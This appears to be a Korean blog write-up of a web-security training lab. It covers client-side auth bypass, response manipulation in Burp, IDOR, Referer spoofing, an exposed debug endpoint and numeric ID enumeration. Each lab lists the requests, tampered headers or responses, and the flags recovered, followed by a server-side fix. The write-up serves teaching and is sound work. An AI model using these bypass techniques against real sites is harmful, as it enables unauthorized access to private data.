---
title: "웹보안 및 모의해킹 Lab - Auth Labs (3) Response Manipulation and Enumeration"
date: 2026-03-20T18:20:00+09:00
categories:
  - Web Hacking
tags:
  - Web Security Lab
  - Auth Labs
  - Client-Side Access Control
  - Response Manipulation
  - Referer Spoofing
  - API Enumeration
last_modified_at: 2026-03-26T18:20:00+09:00
published: true
---
## 문제

대상: `http://192.168.0.21:8080/vuln/auth/`

범위: `LAB11 ~ LAB12`, `LAB18 ~ LAB22`

## 개요

서버가 실제로는 중요한 데이터를 이미 내려주고 있거나, 응답 결과 하나만 믿고 클라이언트에서 접근을 허용하거나, 숨겨진 엔드포인트와 숫자 인덱스가 그대로 노출되는 경우를 정리함

자주 확인한 패턴은 다음과 같음

- 민감정보를 서버 응답에 이미 포함
- 클라이언트에서만 비밀번호 검증
- 응답의 `true/false` 결과만 믿고 후속 동작 수행
- `Referer` 같은 헤더를 접근 제어 기준으로 사용
- 주석과 변경 이력에 남은 디버그 엔드포인트
- 숫자형 식별자 반복 조회

## LAB11. Client-Side Auth Bypass

### 개요

비밀글의 본문과 비밀번호가 서버 응답에 이미 포함되어 있고, 클라이언트 JavaScript는 비밀번호를 비교한 뒤에만 화면에 보여주는 구조

### 문제 코드

```javascript
function viewPost(id) {
    fetch('?action=view&id=' + id)
        .then(r => r.json())
        .then(data => {
            const post = data.post;

            if (post.is_secret == 1) {
                window._currentPost = post;
                window.checkPassword = function() {
                    const input = document.getElementById('postPassword').value;
                    if (input === post.password) {
                        document.getElementById('postContent').textContent = post.content;
                    }
                };
            }
        });
}
```

### 분석 포인트

- 서버는 비밀글이라도 `content`, `password`를 모두 응답에 포함함
- 클라이언트는 그 값을 받아 놓고 화면에만 숨김 처리함
- 즉 보호 대상 데이터가 이미 응답에 들어왔기 때문에, 비밀번호 입력 자체가 의미가 없어짐

### 사용한 요청

```text
?action=view&id=3
```

### 응답

```json
{"success":true,"post":{"id":3,"title":"[긴급] 보안 감사 결과 보고","content":"2024년 보안감사 결과 보고서\n\n■ 발견된 취약점: 내부 VPN 설정 미흡\n■ VPN 접속 정보: vpn.seculab.internal\n■ 임시 계정: audit_temp / Security@2024!\n■ 조치 기한: 2024.02.28\n\n위 정보는 대외비이므로 외부 유출에 주의바랍니다.","author":"administrator","category":"보안","password":"audit2024!","is_secret":1,"created_at":"2024-01-15 01:30:00"}}
```

### 결과

```text
Security@2024!
```

### 정리

비밀번호 검증은 서버가 해야 하며, 민감한 본문과 비밀번호를 먼저 내려준 뒤 클라이언트에서 가리는 방식은 보호가 아님

## LAB12. Response Manipulation

### 개요

이번에는 비밀번호 검증이 서버에서 수행되지만, 검증 결과 응답의 `result` 값만 보고 클라이언트가 본문을 보여주는 구조

### 문제 코드

```html
<!-- 비밀글 내용이 hidden 상태로 DOM에 포함됨 -->
<div id="postDataStore" style="display:none;">
    <div class="post-data"
         data-id="7"
         data-title="[내부] 스테이징 배포 토큰"
         data-author="administrator"
         data-category="보안"
         data-created="2024-01-28 02:00"
         data-secret="1"
         data-content="배포 에이전트용 내부 토큰입니다.

DEPLOY_TOKEN=rm-bypass-9f2a1c">
```

### 분석 포인트

- 서버 검증을 거친다고 해도, 클라이언트가 응답의 `result`만 믿고 동작함
- 동시에 민감한 본문이 hidden 상태로 DOM에 미리 포함되어 있음
- 즉 응답 변조 또는 DOM 열람 둘 중 하나만 가능해도 내용 확인이 가능함

### 사용한 방법

- Burp에서 비밀번호 검증 응답 가로채기
- `result=false` 또는 실패 응답을 `result=true`, `message=ok`로 수정

### 변조 후 응답

```http
HTTP/1.1 200 OK
Content-Type: application/json; charset=utf-8

{"result":true,"message":"ok"}
```

### 결과

```text
rm-bypass-9f2a1c
```

### 정리

권한 검증 결과를 클라이언트가 전적으로 신뢰하고, 본문까지 DOM에 미리 넣어 두면 Response Manipulation으로 쉽게 우회 가능함

## LAB18. Support Ticket IDOR

### 개요

티켓 상세 조회 API가 `ticket_id`만으로 동작하며, 관리자 전용 큐에 있는 티켓도 그대로 조회 가능한 구조

### 문제 코드

```javascript
fetch('?action=list').then(function(r){return r.json();})

function view(id){
    fetch('?action=view&ticket_id='+id)
        .then(function(r){return r.json();})
        .then(function(d){
            document.getElementById('mb').textContent=d.ticket.body;
        });
}
```

### 사용한 요청

```text
?action=view&ticket_id=1
```

### 응답

```json
{"success":true,"ticket":{"id":1,"user_id":1,"subject":"[시스템] 보안팀 내부 이슈","body":"티켓 내부 참조 코드: TICKET-IDOR-SECRET-2024\n\n본 티켓은 관리자 전용 큐에만 표시됩니다.","status":"처리중","created_at":"2026-03-26 01:10:27"}}
```

### 결과

```text
TICKET-IDOR-SECRET-2024
```

### 정리

목록과 상세 API가 분리된 구조에서 상세 API의 인가 검증이 빠지면, 관리자 티켓도 `ticket_id`만 바꿔 그대로 조회 가능함

## LAB19. Referer-Based Access Control

### 개요

내부 리포트 API는 요청의 출처를 `Referer` 헤더로 판단하는 구조

### 문제 코드

```javascript
document.getElementById('b2').addEventListener('click',function(){
    fetch('?action=internal_report').then(function(r){return r.json();}).then(show);
});
```

페이지 문구도 직접 힌트 제공

```html
<p>내부 분기 리포트(사내 /internal/ 에서만 허용): <button type="button" class="btn btn-b" id="b2">internal_report</button></p>
```

즉 서버가 요청의 실제 사용자 권한보다 “어디서 왔는가”를 더 중요하게 본다고 의심 가능

### 분석 포인트

- 브라우저 원본 요청에서는 `Referer: /vuln/auth/lab19.php`
- 서버는 `/internal/` 경로에서 온 요청만 허용하는 것으로 보임
- 그러나 `Referer`는 사용자가 조작 가능한 헤더임

### 원본 요청

```http
GET /vuln/auth/lab19.php?action=internal_report HTTP/1.1
Referer: http://192.168.0.21:8080/vuln/auth/lab19.php
```

### 조작한 헤더

```http
Referer: http://192.168.0.21:8080/internal/
```

### 응답

```json
{"success":true,"report_id":"REF-2024-Q1","classification":"내부용","token":"REFERER-SPOOF-BYPASS-2024","summary":"이 리포트는 사내 /internal/ 경로에서만 배포되도록 설정되어 있습니다."}
```

### 결과

```text
REFERER-SPOOF-BYPASS-2024
```

### 정리

Referer는 참고 정보일 뿐 인증 수단이 아님. 이를 접근 제어 기준으로 사용하면 간단한 헤더 스푸핑으로 우회 가능함

## LAB20. API Version Debug Endpoint

### 개요

공개 API 문서에는 `v1`만 안내되어 있지만, 소스 주석에는 `v2_debug` 힌트가 남아 있고 이를 직접 호출 시 내부 토큰이 노출되는 구조

### 문제 코드

```html
<!-- API changelog: v2_debug는 스테이징 검증용으로 남겨둠 — 운영 라우터에서만 비활성화 예정 -->
```

```javascript
document.getElementById('bv1').addEventListener('click',function(){
    fetch('?action=v1_user')
});
```

화면 문구: 모든 클라이언트가 `v1` 사용
주석에 남은 다른 버전 이름: 더 중요한 단서

### 사용한 요청

```text
?action=v2_debug
```

### 응답

```json
{"success":true,"warning":"DEBUG BUILD — 운영 배포 전 제거 필요","internal_token":"API-V2-DEBUG-TOKEN-2024","service_mesh":"istio-prod.seculab.svc","vault_path":"secret/data/app/admin"}
```

### 결과

```text
API-V2-DEBUG-TOKEN-2024
```

### 정리

주석, 변경 이력, 레거시 변수명은 운영에 남아 있는 디버그 엔드포인트를 찾는 중요한 단서가 됨

## LAB21. Python - Employee ID Enumeration

### 개요

직원 조회 API가 숫자형 `emp_id` 하나로 동작하며, 특정 ID에서만 `internal_code`가 채워진 레코드가 존재하는 구조

### 문제 코드

```javascript
document.getElementById('btnTry').addEventListener('click',function(){
    var id=document.getElementById('eid').value;
    fetch('?action=lookup&emp_id='+encodeURIComponent(id)).then(function(r){return r.json();})
});
```

페이지 안내 문구도 브라우저 쿠키를 Python 요청에 그대로 넣도록 유도

```html
<div class="hint">
    API 예: <code>GET lab21.php?action=lookup&amp;emp_id=1</code><br>
    로그인 세션이 필요합니다. Python에서는 브라우저의 <code>Cookie</code> 헤더를 그대로 넣으세요.
</div>
```

즉 단순 단건 조회 기능 아님
같은 형식 요청을 범위 반복하도록 유도하는 구조

### 분석 포인트

- 단건 조회 API는 정상 동작을 보여주는 용도
- 그러나 `emp_id`가 숫자형이고 응답 구조가 일정하면 반복 조회가 쉬움
- Burp Intruder나 Python 스크립트로 범위 탐색 가능함

### 확인한 응답

```http
HTTP/1.1 200 OK
Content-Type: application/json; charset=utf-8

{"success":true,"emp_id":37,"name":"사용자-037","dept":"운영팀","internal_code":"ENUM-LAB21-EMP-INTERNAL-2024"}
```

### 결과

```text
ENUM-LAB21-EMP-INTERNAL-2024
```

### 정리

예측 가능한 숫자형 식별자와 균일한 응답 구조는 열거 공격에 매우 취약함

## LAB22. Python - Snapshot Index Enumeration

### 개요

DB 스냅샷 메타 조회 API는 `idx`만 받아 동작하고, 특정 인덱스에서만 `recovery_key`가 존재하는 구조

### 문제 코드

```javascript
document.getElementById('btnTry').addEventListener('click',function(){
    var id=document.getElementById('idx').value;
    fetch('?action=snapshot&idx='+encodeURIComponent(id)).then(function(r){return r.json();})
});
```

### 분석 포인트

- `idx`가 1부터 증가하는 단순 숫자
- 응답 형식이 일정하고 실패/성공 여부가 명확함
- 따라서 Python 또는 Burp Intruder로 빠르게 전수 확인 가능함

### 확인한 응답

```http
HTTP/1.1 200 OK
Content-Type: application/json; charset=utf-8

{"success":true,"idx":22,"label":"backup-022.sql.gz","size_kb":254,"recovery_key":"SNAPSHOT-LAB22-BACKUP-KEY-2024"}
```

### 결과

```text
SNAPSHOT-LAB22-BACKUP-KEY-2024
```

### 정리

스냅샷, 티켓, 사용자처럼 숫자형 인덱스를 그대로 사용하는 API는 열거형 공격에 취약하며, 민감한 필드를 조건부로만 숨기는 것으로는 충분하지 않음

## 정리

이번 구간에서 핵심이 된 취약점은 다음과 같음

- `Client-Side Access Control`
- `Response Manipulation`
- `Referer Spoofing`
- `Debug Endpoint Exposure`
- `API Enumeration`

공통점: 서버가 이미 너무 많은 정보를 내려주거나 조작 가능한 요청/응답 요소를 신뢰한 점
권한 검증은 서버에서 수행해야 하고, 숨겨진 DOM, 헤더, 숫자 인덱스, 디버그 라우트는 모두 공격 표면이 될 수 있음



